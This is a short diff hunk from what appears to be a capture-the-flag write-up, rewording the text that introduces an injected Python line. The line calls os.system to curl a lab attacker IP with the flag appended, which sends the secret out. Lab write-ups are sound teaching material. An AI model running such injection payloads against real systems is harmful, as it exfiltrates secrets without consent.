@@ -136,7 +136,7 @@ We are going to use the following IP: ``10.10.14.7``.
 
 We are now ready to retrieve that flag!
 
-With the following line, we will be able to execute a bash system command, call curl appending to the url the variable we want:
+With the following line, we will be able to execute a bash system command, call curl appending the flag to the url:
 
 ```py
 __import__('os').system("curl http://10.10.14.7/" + flag)
